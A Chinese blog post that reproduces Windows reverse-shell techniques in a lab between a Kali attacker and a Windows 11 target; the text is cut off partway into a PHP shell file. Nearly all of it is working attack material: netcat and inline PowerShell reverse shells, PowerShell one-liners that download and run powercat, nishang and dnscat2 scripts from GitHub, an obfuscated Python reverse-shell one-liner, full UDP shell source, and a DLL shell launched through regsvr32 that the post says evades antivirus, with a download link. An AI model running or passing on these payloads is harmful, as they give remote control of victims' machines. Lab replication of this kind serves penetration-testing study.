<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>windows反弹shell复现 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="windows反弹shell复现" />
<meta property="og:description" content="windows反弹shell 简介：
reverse shell（反弹shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell类似，本质上是网络概念的客户端与服务端的角色反转，就是让目标机执行反向连接攻击机。
在实战中多配置命令执行等漏洞进行使用。
环境：
攻击机：IP为192.168.1.111，系统信息 Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux
目标机：IP为192.168.1.108，系统信息 Microsoft Windows 11 专业版
原理示意图：
一、netcat-windows反弹（nc反弹）：需要攻击机安装netcat,通过netcat建立反向连接。 攻击机监听: nc -lvvp 6666
目标机执行: nc 192.168.1.111 6666 -e c:\windows\system32\cmd.exe 攻击机：
目标机：
二、Powershell-windows反弹 Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。它引入了许多非常有用的新概念，从而进一步扩展了您在 Windows 命令提示符和 Windows Script Host 环境中获得的知识和创建的脚本。
一旦攻击者可以在一台计算机上运行代码，他们便可以下载powershell脚本文件（.ps1）到磁盘执行，脚本可以在内存中运行(无文件化)。我们可以将powershell看做是命令提示符cmd.exe的扩展。
powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。
1、使用powercat 攻击机监听: nc -lvp 6666 目标机执行（通过github远程下载执行）：
powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 192.168.1.111 -p 6666 -e cmd 攻击机：
目标机：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/076ccd43a61026bea1eae5aedd1458cd/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-06T15:22:52+08:00" />
<meta property="article:modified_time" content="2022-04-06T15:22:52+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">windows反弹shell复现</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 style="margin-left:0px;text-align:center;"><a name="7995-1648607729702"></a><strong>windows反弹shell</strong></h2> 
<p></p> 
<p></p> 
<p></p> 
<p style="margin-left:0;"><a name="2918-1648607752328"></a><strong>简介：</strong></p> 
<p style="margin-left:0;"><a name="6579-1648608612729"></a>reverse shell（反弹shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell类似，本质上是网络概念的客户端与服务端的角色反转，就是让目标机执行反向连接攻击机。</p> 
<p style="margin-left:0;">在实战中多配置命令执行等漏洞进行使用。</p> 
<p style="margin-left:0;"><a name="9067-1648608701399"></a><strong>环境：</strong></p> 
<p style="margin-left:0;"><a name="5848-1648690430878"></a>攻击机：IP为192.168.1.111，系统信息 Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 GNU/Linux</p> 
<p style="margin-left:0;"><a name="6077-1648690510892"></a>目标机：IP为192.168.1.108，系统信息 Microsoft Windows 11 专业版</p> 
<p style="margin-left:0;"><a name="2480-1648690625749"></a><strong>原理示意图：</strong></p> 
<p style="margin-left:0;"><a name="1390-1648609999914"></a><img alt="" height="711" src="https://images2.imgbox.com/26/06/8yx8YZFK_o.png" width="1200"></p> 
<h2 style="margin-left:0;"><a name="6354-1648608801288"></a><span style="color:#df402a;">一、</span>netcat-windows反弹（nc反弹）：需要攻击机安装netcat,通过netcat建立反向连接。</h2> 
<p style="margin-left:0;"><a name="2078-1648611592652"></a><strong>攻击机监听: </strong>nc -lvvp 6666</p> 
<p style="margin-left:0;"><a name="3566-1648621097442"></a><strong>目标机执行</strong>: nc 192.168.1.111 6666 -e c:\windows\system32\cmd.exe </p> 
<p style="margin-left:0;"><a name="3013-1648623204627"></a><strong>攻击机</strong>：</p> 
<p style="margin-left:0;"><a name="6730-1648623198123"></a><img alt="" height="284" src="https://images2.imgbox.com/4d/4e/UD55zDdV_o.png" width="807"></p> 
<p style="margin-left:0;"><a name="4388-1648607752509"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="2117-1648623232159"></a><img alt="" height="88" src="https://images2.imgbox.com/ca/0a/CWuVQXG3_o.png" width="1182"></p> 
<h2 style="margin-left:0;"><a name="9430-1648623217735"></a><span style="color:#df402a;">二、</span>Powershell-windows反弹</h2> 
<p style="margin-left:0;"><a name="8864-1648624586660"></a>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。它引入了许多非常有用的新概念，从而进一步扩展了您在 Windows 命令提示符和 Windows Script Host 环境中获得的知识和创建的脚本。</p> 
<p style="margin-left:0;"><a name="9246-1648624599685"></a>一旦攻击者可以在一台计算机上运行代码，他们便可以下载powershell脚本文件（.ps1）到磁盘执行，脚本可以在内存中运行(无文件化)。我们可以将powershell看做是命令提示符cmd.exe的扩展。</p> 
<p style="margin-left:0;"><a name="9950-1648624586830"></a>powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat。</p> 
<h3 style="margin-left:0;"><a name="1793-1648624704277"></a>1、使用powercat</h3> 
<p style="margin-left:0;"><a name="3379-1648624587007"></a><strong>攻击机监听: </strong></p> 
<pre><code class="language-bash">nc -lvp 6666</code></pre> 
<p style="margin-left:0;"><a name="4582-1648623263935"></a><strong>目标机执行（通过github远程下载执行）：</strong></p> 
<pre><code class="language-bash">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.1.111 -p 6666 -e cmd</code></pre> 
<p style="margin-left:0;"><a name="0045-1648625882107"></a><strong>攻击机</strong>：</p> 
<p style="margin-left:0;"><a name="6179-1648627371967"></a><img alt="" height="271" src="https://images2.imgbox.com/a4/b5/QP0xihCO_o.png" width="759"></p> 
<p style="margin-left:0;"><a name="1011-1648625951230"></a></p> 
<p style="margin-left:0;"><a name="7465-1648625889984"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="4891-1648627374803"></a><img alt="" height="79" src="https://images2.imgbox.com/e7/de/Dr1wsdvz_o.png" width="1200"></p> 
<h3 style="margin-left:0;"><a name="5344-1648623264099"></a>2、使用powershell函数执行</h3> 
<p style="margin-left:0;"><a name="7061-1648627219370"></a><strong>攻击机监听: </strong></p> 
<pre><code class="language-bash"> nc -lvp 6666</code></pre> 
<p style="margin-left:0;"><a name="3616-1648627256610"></a><strong>目标机执行：</strong></p> 
<pre><code class="language-bash">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.111',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre> 
<p style="margin-left:0;"><a name="5248-1648627282841"></a><strong>攻击机</strong>：</p> 
<p style="margin-left:0;"><a name="7480-1648627367423"></a><img alt="" height="220" src="https://images2.imgbox.com/eb/8b/LKrYtyU8_o.png" width="821"></p> 
<p style="margin-left:0;"><a name="2511-1648627332021"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="4687-1648627399643"></a><img alt="" height="190" src="https://images2.imgbox.com/de/b4/sjiCXQ0u_o.png" width="1200"></p> 
<h3 style="margin-left:0;"><a name="3954-1648627337555"></a>3、Reverse TCP shell</h3> 
<p style="margin-left:0;"><a name="3744-1648627404666"></a>Nishang(https://github.com/samratashok/nishang )，是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</p> 
<p style="margin-left:0;"><a name="4062-1648631651023"></a><span style="color:#1c487f;">需要用哪种反弹方式可以去github上选择，在攻击机执行的payload修改对应shell地址就行。</span></p> 
<p style="margin-left:0;"><a name="5223-1648630867840"></a>Nishang要在PowerShell3.0以上的环境下才可以正常使用，在window 7或者server2008上可能会出现一些异常。</p> 
<p style="margin-left:0;"><a name="8977-1648706888658"></a>关于使用nishang进行反弹是通过powershell远程调用github上的powershell脚本进行反弹连接。</p> 
<p style="margin-left:0;"><a name="9287-1648706939653"></a></p> 
<p style="margin-left:0;"><a name="4998-1648631840349"></a>Nishang项目展示：</p> 
<p style="margin-left:0;"><a name="7158-1648631833465"></a><img alt="" height="1200" src="https://images2.imgbox.com/53/bc/TRRNQmzY_o.png" width="1200"></p> 
<p style="margin-left:0;"><a name="8474-1648628815264"></a><strong>攻击机监听: </strong></p> 
<pre><code class="language-bash"> nc -lvp 6666</code></pre> 
<p style="margin-left:0;"><a name="7584-1648627404904"></a><strong>目标机执行（此处使用github远程调用，也可将nishang下载到本地调用执行）：</strong></p> 
<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.111 -port 6666</code></pre> 
<p style="margin-left:0;"><a name="7534-1648628951060"></a><strong>攻击机</strong>：</p> 
<p style="margin-left:0;"><a name="9439-1648628981060"></a><img alt="" height="266" src="https://images2.imgbox.com/10/13/8sU4Oq3d_o.png" width="815"></p> 
<p style="margin-left:0;"><a name="3727-1648628958895"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="4080-1648629001275"></a><img alt="" height="116" src="https://images2.imgbox.com/8d/e4/Ezb8caPE_o.png" width="1200"></p> 
<h3 style="margin-left:0;"><a name="8445-1648628951425"></a>4、Reverse UDP shell</h3> 
<p style="margin-left:0;"><a name="5935-1648628952574"></a><strong>攻击机监听: </strong></p> 
<pre><code class="language-bash">nc -lup 5399</code></pre> 
<p style="margin-left:0;"><a name="1092-1648629443834"></a><strong>目标机执行：</strong></p> 
<p style="margin-left:0;"><a name="7459-1648631607546"></a><strong>第一个：</strong></p> 
<p style="margin-left:0;"></p> 
<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress 192.168.1.111 -port 5399</code></pre> 
<p style="margin-left:0;"><a name="2411-1648631535458"></a><strong>第二个（两个都可以，只是不同的远程地址）：</strong></p> 
<p style="margin-left:0;"></p> 
<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellUdp.ps1');Invoke-PowerShellUdp -Reverse -IPAddress 192.168.1.111 -port 5399
​</code></pre> 
<p style="margin-left:0;"><a name="4080-1648631002527"></a><strong>攻击机</strong>：</p> 
<p style="margin-left:0;"><a name="2757-1648631219733"></a><img alt="" height="194" src="https://images2.imgbox.com/a5/a4/kydihoX9_o.png" width="719"></p> 
<p style="margin-left:0;"><a name="1680-1648629443834"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="9519-1648631229895"></a><img alt="" height="230" src="https://images2.imgbox.com/d8/d3/fsN3d3nE_o.png" width="1200"></p> 
<h3 style="margin-left:0;"><a name="3913-1648629397594"></a>5、Reverse ICMP shell</h3> 
<p style="margin-left:0;"><a name="1621-1648632018122"></a>需要利用icmpsh_m.py (<a href="https://github.com/bdamele/icmpsh" title="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a>)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。</p> 
<p style="margin-left:0;"><a name="6576-1648632651815"></a>首先攻击端下载icmpsh_m.py文件：</p> 
<p style="margin-left:0;"><a name="2518-1648689115988"></a><img alt="" height="1200" src="https://images2.imgbox.com/87/af/JEDtUn3P_o.png" width="1200"></p> 
<p style="margin-left:0;"><a name="3886-1648632019446"></a>icmpsh_m.py  Usage（使用说明）：</p> 
<p style="margin-left:0;"><a name="9841-1648690048007"></a>python icmpsh_m.py [Attacker IP] [Victim IP]</p> 
<p style="margin-left:0;"><a name="1048-1648629397773"></a><strong>攻击机监听：</strong></p> 
<p style="margin-left:0;"><a name="1673-1648690108273"></a>sysctl -w net.ipv4.icmp_echo_ignore_all=1       #关闭kali自身的icmp，避免影响攻击机向目标机发送的信息。sysctl命令可能需要修复，执行rm -f /sbin/sysctl 和 ln -s /bin/true /sbin/sysctl两条命令。</p> 
<p style="margin-left:0;"><a name="7223-1648697620703"></a></p> 
<p style="margin-left:0;"><a name="7675-1648632697948"></a>python icmpsh_m.py 192.168.1.111 192.168.1.108   #开启ICMP数据监听，需要攻击机具有python环境，可能会报错 You need to install Python Impacket library first，需要安装Impacket库：<a name="9013-1648697783533"></a></p> 
<p style="margin-left:0;"><a name="8336-1648697819657"></a></p> 
<pre><code>git clone https://github.com/CoreSecurity/impacket.git     #步骤1

cd impacket/  #步骤2

python setup.py install      #步骤3
​</code></pre> 
<p style="margin-left:0;"><a name="4549-1648694295857"></a><strong>备注：</strong>Impacket解释参考：<a href="https://www.cnblogs.com/backlion/p/10676339.html" rel="nofollow" title="Impacket官方使用指南 - 渗透测试中心 - 博客园">Impacket官方使用指南 - 渗透测试中心 - 博客园</a></p> 
<p style="margin-left:0;"><a name="7170-1648694926833"></a></p> 
<p style="margin-left:0;"><a name="7730-1648690969306"></a><strong>目标机执行：</strong></p> 
<p style="margin-left:0;"><a name="6810-1648690991776"></a></p> 
<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.1.111</code></pre> 
<p style="margin-left:0;"><a name="3093-1648708426159"></a></p> 
<p style="margin-left:0;"><a name="7146-1648708426562"></a><strong>攻击机：</strong></p> 
<p style="margin-left:0;"><a name="5720-1648718740207"></a><img alt="" height="181" src="https://images2.imgbox.com/b6/de/FAm2VqIe_o.png" width="808"></p> 
<p style="margin-left:0;"><a name="6564-1648718660224"></a><strong>目标机</strong></p> 
<p style="margin-left:0;"><a name="8034-1648718747943"></a><img alt="" height="192" src="https://images2.imgbox.com/33/23/ZYBJ65Oc_o.png" width="1200"></p> 
<h3 style="margin-left:0;"><a name="2261-1648710760559"></a>6、Reverse HTTP/HTTPS shell （只尝试了HTTP）</h3> 
<p style="margin-left:0;"><a name="5067-1648711403357"></a></p> 
<p style="margin-left:0;"><a name="6190-1648710747011"></a><strong>攻击机监听：</strong>nc -lvvp 4444</p> 
<p style="margin-left:0;"><a name="3040-1648711466275"></a><strong>目标机执行：(无法执行，提示调用powershel脚本编写错误，以下两个反弹都无法使用)</strong></p> 
<p style="margin-left:0;"><a name="2652-1648690988968"></a></p> 
<pre><code class="language-bash">powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/414ee1104526d7057f9adaeee196d91ae447283e/Shells/Invoke-PoshRatHttp.ps1');Invoke-PoshRatHttp -IPAddress 192.168.1.111 -Port 4444</code></pre> 
<p style="margin-left:0;"><a name="3422-1648711752532"></a></p> 
<p style="margin-left:0;"><a name="2146-1648711976297"></a></p> 
<h3 style="margin-left:0;"><a name="1523-1648690887379"></a>7、dnscat2 反弹DNS shell</h3> 
<p style="margin-left:0;"><a name="9683-1648712485887"></a></p> 
<p style="margin-left:0;"><a name="4443-1648712070730"></a>dnscat2(https://github.com/iagox86/dnscat2 )是一个DNS隧道，旨在通过DNS协议创建加密的命令和控制（C＆C）通道。dnscat2分为两部分：客户端和服务器。dnscat2客户端采用C语言编写，服务器端采用ruby语言编写。后来又有安全研究人员使用PowerShell脚本重写了dnscat2客户端dnscat2-powershell(<a href="https://github.com/lukebaggett/dnscat2-powershell%29" title="https://github.com/lukebaggett/dnscat2-powershell)">https://github.com/lukebaggett/dnscat2-powershell)</a></p> 
<p style="margin-left:0;"><a name="3034-1648712415288"></a></p> 
<p style="margin-left:0;"><a name="3635-1648712534414"></a>Ruby，一种简单快捷的面向对象（面向对象程序设计）脚本语言。</p> 
<p style="margin-left:0;"><a name="3985-1648713282825"></a></p> 
<p style="margin-left:0;"><a name="8260-1648713283567"></a>服务端为Ruby编写，需安装Ruby环境，下面连接为kali配置dnscat2参考：</p> 
<p style="margin-left:0;"><a name="2670-1648714196333"></a><a href="https://blog.csdn.net/redwand/article/details/113481153" title="【内网流量操控技术五】dnscat2配置_redwand的博客-CSDN博客_dnscat2">【内网流量操控技术五】dnscat2配置_redwand的博客-CSDN博客_dnscat2</a></p> 
<p style="margin-left:0;"><a name="1452-1648714943856"></a><span style="color:#393939;">执行bundle install时卡住，更换dnscat2/server目录下Gemfile文件中ruby源地址为</span>https://gems.ruby-china.com，因原来地址已不支持下载。</p> 
<p style="margin-left:0;"><a name="7534-1648715084682"></a>更新前：</p> 
<p style="margin-left:0;"><a name="7766-1648715041081"></a><img alt="" height="344" src="https://images2.imgbox.com/ff/c8/Y4hyLE75_o.png" width="1034"></p> 
<p style="margin-left:0;"><a name="2090-1648712539599"></a>更新后：</p> 
<p style="margin-left:0;"><a name="1137-1648715167399"></a><img alt="" height="497" src="https://images2.imgbox.com/94/ac/Hvx6evjs_o.png" width="1091"></p> 
<p style="margin-left:0;"><a name="6460-1648711912825"></a>更新后正常下载：</p> 
<p style="margin-left:0;"><a name="3236-1648715296549"></a><img alt="" height="412" src="https://images2.imgbox.com/5a/70/05dYARjc_o.png" width="1108"></p> 
<p style="margin-left:0;"><a name="7252-1648715170177"></a><strong>攻击机监听</strong>：</p> 
<pre><code class="language-bash">sudo ruby dnscat2.rb --dns "domain=lltest.com,host=192.168.1.111" --no-cache -e open</code></pre> 
<p style="margin-left:0;"><a name="6667-1648712448026"></a></p> 
<p style="margin-left:0;"><a name="8390-1648712400614"></a><strong>目标机执行：</strong></p> 
<p style="margin-left:0;"><a name="2344-1648632698125"></a></p> 
<pre><code class="language-bash">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer 192.168.1.111</code></pre> 
<p style="margin-left:0;"><a name="5875-1648712076630"></a></p> 
<p style="margin-left:0;"><a name="3880-1648717029629"></a>成功反弹shell后，攻击机执行：<br><a name="7930-1648717048439"></a></p> 
<pre><code class="language-bash">session -i 1 #第一步，进入到session 1

shell        #第二步，执行后生成新的session 需要通过session -1 2 切换

session -i 2 #第三步，在目标机执行命令</code></pre> 
<p style="margin-left:0;"><a name="1652-1648712076794"></a></p> 
<p style="margin-left:0;"><a name="2582-1648717140933"></a><strong>攻击机：</strong></p> 
<p style="margin-left:0;"><a name="7733-1648717197263"></a><img alt="" height="291" src="https://images2.imgbox.com/cc/c0/gV7tzkSg_o.png" width="1113"></p> 
<p style="margin-left:0;"><a name="1752-1648717232792"></a></p> 
<p style="margin-left:0;"><a name="3812-1648717232792"></a><img alt="" height="166" src="https://images2.imgbox.com/85/fa/ImwPcSbd_o.png" width="1071"></p> 
<p style="margin-left:0;"><a name="2643-1648717294110"></a></p> 
<p style="margin-left:0;"><a name="4179-1648717294110"></a><img alt="" height="58" src="https://images2.imgbox.com/77/1b/tjWiKEpV_o.png" width="798"></p> 
<p style="margin-left:0;"><a name="9629-1648717240324"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="5390-1648718467522"></a><img alt="" height="120" src="https://images2.imgbox.com/45/2c/OgVKSlc4_o.png" width="1200"><a name="5385-1648627219616"></a><a name="1114-1649216922138"></a></p> 
<p style="margin-left:0;"><a name="5042-1649217286899"></a></p> 
<h2 style="margin-left:0;"><a name="7595-1648779025416"></a>三、python2 反弹 shell</h2> 
<p style="margin-left:0;"><a name="9941-1648888399184"></a>被攻击机需要python环境</p> 
<p style="margin-left:0;"><a name="2819-1648888448671"></a><img alt="" height="160" src="https://images2.imgbox.com/96/1f/EzAKOPk9_o.png" width="1200"></p> 
<p style="margin-left:0;"><a name="7900-1648858743151"></a></p> 
<h3 style="margin-left:0;"><a name="4054-1648888554177"></a>1、python2 TCP shell</h3> 
<p style="margin-left:0;"><a name="5540-1648858863319"></a><strong>攻击机监听：</strong></p> 
<pre><code class="language-bash">nc -lvvp 4444</code></pre> 
<p style="margin-left:0;"><a name="1656-1648858845256"></a></p> 
<p style="margin-left:0;"><a name="6885-1648607763539"></a><strong>目标机执行：</strong></p> 
<p style="margin-left:0;"><a name="1599-1648607749239"></a></p> 
<pre><code class="language-python">python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('192.168.1.111', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\windows\system32\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</code></pre> 
<p style="margin-left:0;"><a name="3837-1648805406432"></a></p> 
<p style="margin-left:0;"><a name="7248-1648859964403"></a><strong>攻击机：</strong></p> 
<p style="margin-left:0;"><a name="2437-1648860059085"></a><img alt="" height="347" src="https://images2.imgbox.com/38/bc/C6hpkJC3_o.png" width="1121"></p> 
<p style="margin-left:0;"><a name="8035-1648859964604"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="4037-1648860075863"></a><img alt="" height="736" src="https://images2.imgbox.com/24/11/rCQh1F1W_o.png" width="1200"><a name="8340-1648805406752"></a></p> 
<h3 style="margin-left:0;"><a name="1015-1648888607230"></a>2、python UDP反弹shell</h3> 
<p style="margin-left:0;"><a name="8040-1648858905337"></a>用到：<a href="https://github.com/ecthros/udpshell/blob/master/udpshell.py" title="https://github.com/ecthros/udpshell/blob/master/udpshell.py">https://github.com/ecthros/udpshell/blob/master/udpshell.py</a></p> 
<p style="margin-left:0;"><a name="7061-1648889421542"></a>udpshell.py源码：</p> 
<p style="margin-left:0;"><a name="3576-1648858905913"></a></p> 
<pre><code class="language-python">import socket

import subprocess

import sys

from random import randint

#receive data, send to popen, send back

if(len(sys.argv) &lt; 2):

print("Usage: ./udpshell &lt;send_ip&gt; &lt;send_port&gt;")

exit(1)

recv_ip = "0.0.0.0"

recv_port = randint(1024, 65535)

send_ip = sys.argv[1] #127.0.0.1

send_port = int(sys.argv[2]) #5005

#print("Your client should be: python udpclient.py " + sys.argv[3] + " " + sys.argv[2] + " " + sys.argv[1])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP

sock.bind((recv_ip, recv_port))

#sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP

sock.sendto("Begin Connection id: 3242", (send_ip, send_port))

while True:

command, addr = sock.recvfrom(1024) # buffer size is 1024 bytes

if(command == "exit"):

break

proc = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

output = proc.stdout.read() + proc.stderr.read()

sock.sendto(output, (send_ip, send_port))</code></pre> 
<p style="margin-left:0;"><a name="7015-1648889431251"></a><strong>攻击机监听</strong>：</p> 
<pre><code class="language-bash">nc -lup 555</code></pre> 
<p style="margin-left:0;"><a name="1437-1648889575823"></a><strong>目标机执行</strong>：</p> 
<pre><code class="language-bash">python udpshell.py 192.168.1.111 555 udp</code></pre> 
<p style="margin-left:0;"><a name="9774-1648889612892"></a><strong>攻击机：</strong></p> 
<p style="margin-left:0;"><a name="0070-1648889652961"></a><img alt="" height="472" src="https://images2.imgbox.com/1e/77/jRsbibOZ_o.png" width="1088"></p> 
<p style="margin-left:0;"><a name="8574-1648889627750"></a><strong>目标机：</strong></p> 
<p style="margin-left:0;"><a name="8457-1648889660119"></a><img alt="" height="174" src="https://images2.imgbox.com/77/5a/vuLodcr5_o.png" width="981"></p> 
<h2 style="margin-left:0;"><a name="2739-1648889863616"></a>四、dll 反弹 shell</h2> 
<p style="margin-left:0;"><a name="4516-1649209681992"></a></p> 
<p style="margin-left:0;"><a name="6055-1648889875182"></a>借助反弹工具 by T00Ls.NET 工具。（火绒免杀20220406）</p> 
<p style="margin-left:0;"><a name="2659-1649209690501"></a>工具下载地址：</p> 
<p style="margin-left:0;"><a name="7836-1649209703905"></a>链接：https://pan.baidu.com/s/11h6NCHyZuYY2UVG-X6kEuA</p> 
<p style="margin-left:0;"><a name="2787-1649209698554"></a>提取码：jnsz</p> 
<p style="margin-left:0;"><a name="6925-1649209688184"></a>生成dll文件上传至攻击端，运行命令</p> 
<p style="margin-left:0;"><a name="5755-1649209479105"></a>regsvr32 /s /u server.dll</p> 
<p style="margin-left:0;"><a name="5781-1649209602776"></a><img alt="" height="470" src="https://images2.imgbox.com/c0/0b/6RJliM9H_o.png" width="784"></p> 
<p style="margin-left:0;"><a name="9550-1649206320822"></a><strong>攻击机监听</strong>：</p> 
<pre><code class="language-bash">nc -lvvp 4444</code></pre> 
<p style="margin-left:0;"><a name="9944-1649209821512"></a><strong>目标机执行</strong>：</p> 
<pre><code class="language-bash">regsvr32 /s /u server_x64.dll</code></pre> 
<p style="margin-left:0;"><a name="9889-1649209822614"></a></p> 
<p style="margin-left:0;"><a name="7859-1649209822797"></a><strong>攻击机</strong>：</p> 
<p style="margin-left:0;"><a name="4629-1649209872666"></a><img alt="" height="479" src="https://images2.imgbox.com/40/d6/9ZrihKyR_o.png" width="1021"></p> 
<p style="margin-left:0;"><a name="6328-1649209823093"></a><strong>目标机</strong>:</p> 
<p style="margin-left:0;"><a name="9623-1649209889873"></a><img alt="" height="252" src="https://images2.imgbox.com/48/b5/gdzjxa7j_o.png" width="1150"></p> 
<p style="margin-left:0;"><a name="9351-1649206321364"></a></p> 
<h2 style="margin-left:0;"><a name="6618-1649228032948"></a>五、PHP 反弹 shell</h2> 
<p style="margin-left:0;"><a name="8038-1648858906460"></a>需要php未禁用exec函数。</p> 
<p style="margin-left:0;"><a name="8064-1649228089909"></a><strong>php文件源码：</strong><a name="7297-1649228101318"></a><a name="2628-1649228109587"></a></p> 
<pre><code class="language-php">&lt;?php

$ip   = "192.168.1.159"; //攻击机IP

$port = "4444"; //监听端口

